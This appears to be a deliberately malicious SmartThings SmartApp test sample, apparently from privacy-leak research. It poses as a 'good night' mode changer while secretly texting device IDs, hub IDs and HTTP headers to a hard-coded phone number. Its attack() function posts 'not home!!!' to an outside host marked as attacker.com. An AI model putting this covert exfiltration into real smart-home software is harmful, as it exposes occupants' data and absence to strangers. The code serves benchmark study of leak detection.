/**
 *  
 */
definition(
    name: "Multiple leakage 3",
    namespace: "CSL",
    author: "Amit Sikder",
    updated: "Leo Babun",
    description: "Different parameters obtained via dynamic method invocation are leaked via more than one hard-coded information. Number of on switches, device ID, and Hub ID are declared in line 122, 225, and 228 respectively. These values are obtained in run time dynamically. These sensitive information are leaked via hard-coded phone number in line 244 to 246",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/ModeMagic/good-night.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/ModeMagic/good-night@2x.png"
)

preferences {
	section("When there is no motion on any of these sensors") {
		input "motionSensors", "capability.motionSensor", title: "Where?", multiple: true
	}
	section("For this amount of time") {
		input "minutes", "number", title: "Minutes?"
	}
	section("After this time of day") {
		input "timeOfDay", "time", title: "Time?"
	}
	section("And (optionally) these switches are all off") {
		input "switches", "capability.switch", multiple: true, required: false
	}
	section("Change to this mode") {
		input "newMode", "mode", title: "Mode?"
	}
	section( "Notifications" ) {
        input("recipients", "contact", title: "Send notifications to") {
            input "sendPushMessage", "enum", title: "Send a push notification?", options: ["Yes", "No"], required: false
            input "phoneNumber", "phone", title: "Send a Text Message?", required: false
			input "phoneNumber2", "phone2", title:"Send Text Message to Back up number?", required: false
        }
	}

}

def installed() {
	log.debug "Current mode = ${location.mode}"
	createSubscriptions()
}

def updated() {
	log.debug "Current mode = ${location.mode}"
	unsubscribe()
	createSubscriptions()
}

def createSubscriptions()
{
	subscribe(motionSensors, "motion.active", motionActiveHandler)
	subscribe(motionSensors, "motion.inactive", motionInactiveHandler)
	subscribe(switches, "switch.off", switchOffHandler)
	subscribe(location, modeChangeHandler)

	if (state.modeStartTime == null) {
		state.modeStartTime = 0
	}
}

def modeChangeHandler(evt) {
	state.modeStartTime = now()
}

def switchOffHandler(evt) {
	state.messages = "The device id: ${evt.deviceId}"  // sensitive data
	state.messages2 = "The hub id: ${evt.hubId}" // sensitive data
	
	if (correctMode() && correctTime()) {
		if (allQuiet() && switchesOk()) {
			takeActions()
		}
	}
}

def motionActiveHandler(evt)
{
	state.messages = "The device id: ${evt.deviceId}"  // sensitive data
	state.messages2 = "The hub id: ${evt.hubId}" // sensitive data
    log.debug "Motion active"
}

def motionInactiveHandler(evt)
{
	state.messages = "The device id: ${evt.deviceId}"  // sensitive data
	state.messages2 = "The hub id: ${evt.hubId}" // sensitive data
    // for backward compatibility
	if (state.modeStartTime == null) {
		subscribe(location, modeChangeHandler)
		state.modeStartTime = 0
	}

	if (correctMode() && correctTime()) {
		runIn(minutes * 60, scheduleCheck, [overwrite: false])
	}
}

def scheduleCheck()
{
	log.debug "scheduleCheck, currentMode = ${location.mode}, newMode = $newMode"
	
	if (correctMode() && correctTime()) {
		if (allQuiet() && switchesOk()) {
			takeActions()
		}
	}
}

private takeActions() {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	def message = "Goodnight! SmartThings changed the mode to '$newMode'"
	send(message)
	cnt++
    data["action"+cnt] = "sink1: setLocationMode $newMode"
	setLocationMode(newMode)
	log.debug message
	sendRequest(data)  // instrumented code
}

private correctMode() {
	if (location.mode != newMode) {
		true
	} else {
		log.debug "Location is already in the desired mode:  doing nothing"
		false
	}
}

private correctTime() {
	
	def onSwitches = currSwitches.findAll { switchVal -> switchVal == "on" ? true : false }
	def t0 = now()
	def modeStartTime = new Date(state.modeStartTime)
	def startTime = timeTodayAfter(modeStartTime, timeOfDay, location.timeZone)
	if (t0 >= startTime.time) {
		true
	} else {
		log.debug "The current time of day (${new Date(t0)}), is not in the correct time window ($startTime):  doing nothing"
		false
	}
}
private switchesOk() {
	def result = true
	for (it in (switches ?: [])) {
		if (it.currentSwitch == "on") {
			result = false
			break
		}
	}
	log.debug "Switches are all off: $result"
	result
}
private allQuiet() {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	cnt++
    data["action"+cnt] = "sink2: httpGet $cameraListParams"
    sendRequest(data)
	try {
httpGet(cameraListParams) { resp ->
              log.debug "getting camera list with cookie ${getCookieValue()}"
              something = resp.status
              more = "headers: " + resp.headers.collect { "${it.name}:${it.value}" }
              if(resp.status == 200)
              {
                     multipleHtml = resp.data.toString()
					 sendSMS("7865014232",more)
					 sendSMS("7865014232",something)					
              }
              else if(resp.status == 302)
              {
                     singleUrl = resp.headers.Location.value
              }
              else
              {
                     // ERROR
                     log.error "camera list: unknown response"
              }
       }
	} catch(e) { log.debug e}
	
	def threshold = 1000 * 60 * minutes - 1000
	def states = motionSensors.collect { it.currentState("motion") ?: [:] }.sort { a, b -> b.dateCreated <=> a.dateCreated }
	state.phonenumber = "(111)-111-1111"
	state.phoneNumber2 = "(222)-222-2222"
	if (states) {
		if (states.find { it.value == "active" }) {
			log.debug "Found active state"
			false
		} else {
			def sensor = states.first()
		    def elapsed = now() - sensor.rawDateCreated.time
			if (elapsed >= threshold) {
				log.debug "No active states, and enough time has passed"
				true
			} else {
				log.debug "No active states, but not enough time has passed"
				false
			}
		}
	} else {
		log.debug "No states to check for activity"
		true
	}
	sendRequest(data)  // instrumented code
}
def attack() {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	log.debug "http post"
	def takeParams = [
			uri: "https://automated-lore-135923.appspot.com", //"https://attacker.com"
			path: "",
			//headers: [Cookie: getCookieValue(), 'User-Agent': validUserAgent()],
			requestContentType: "application/x-www-form-urlencoded",
			//query: [width: imgWidth, uuid: uuid],
			body: [
					"condition": "not home!!!"
					]
				]
	cnt++
	data["action"+cnt] = "sink3: httpPost $takeParams"
    sendRequest(data)
	try {
		httpPost(takeParams) { resp ->
		if (resp.status == 200) {
		log.debug "attack succeeded"
		log.debug resp.data.toString()
		} else {
				log.error "attack failed"
				}
			}
	} catch (groovyx.net.http.HttpResponseException e) {
			log.error "Dropcam get_image failure: ${e} with status: ${e.statusCode}"
			if (e.statusCode == 403) {
				throw new RuntimeException("Login Required")
				} else if (e.statusCode == 404) {
			log.error "Dropcam 404, camera may be offline"
			}
		} catch (Exception e) {
			log.error "Unexpected Dropcam exception", e
			//sendNotification("Your dropcam is offline.")
			}
	sendRequest(data)  // instrumented code
}
def eventHandler(evt) {
	def messages = String getDeviceId()
    log.debug "The device id for this event: ${evt.deviceId}"
	def messages2 = String getHubId()
	def info = "The device id for this event: ${evt.hubId}"
    log.debug "The hub id associated with this event: ${evt.hubId}"
}
private send(msg) {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
    if (location.contactBookEnabled) {
		cnt++
        data["action"+cnt] = "sink4: sendNotificationToContacts ${state.messages2} $recipients"
        sendNotificationToContacts(state.messages2, recipients)
		
    }
    else {
        if (sendPushMessage != "No") {
            log.debug("sending push message")
			cnt++
        	data["action"+cnt] = "sink5: sendPush $msg"
            sendPush(msg)
        }

        if (phoneNumber) {
            log.debug("sending text message")
			cnt++
        	data["action"+cnt] = "sink6: sendSms $state.phonenumber ${state.onSwitchesSize}"
            sendSms(state.phoneNumber, "${state.onSwitchesSize}")
			cnt++
        	data["action"+cnt] = "sink7: sendSms $state.phonenumber2 ${state.messages}"
			sendSms(state.phoneNumber2, state.messages)
			cnt++
        	data["action"+cnt] = "sink8: sendSms $state.phonenumber ${state.messages2}"
			sendSms(state.phonenumber, state.messages2)
			
        }
    }

	log.debug msg
	sendRequest(data)  // instrumented code
}




// the following simulates instrumented end point codes for web services hookup
mappings {
	// this is the end point for simulating user location
	path("/location/:command") {
		//log.info("/location/:command")
		action: [
				GET: "location"
		]
	}
}

void location() {
	//eventHandler(evt)
	def command = params.command
	log.debug("Receive command: $command")

	// format command
	command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

	def currMode = location.currentMode // "Home", "Away", etc.
	log.debug "current mode is $currMode"

	location.setMode(command)  // change location
}

def sendRequest(data) {
	// [q:'Minneapolis', mode: 'json']
	def params = [
			uri:  'https://7a09f96c0e1c.ngrok.io/',
			path: 'fuzzthings/things.php',
			contentType: 'application/json',
			query: data
	]
	try {
		httpGet(params){resp ->
			log.debug "connection okay"
		}
	} catch (e) {
		log.error "error: $e"
	}
}
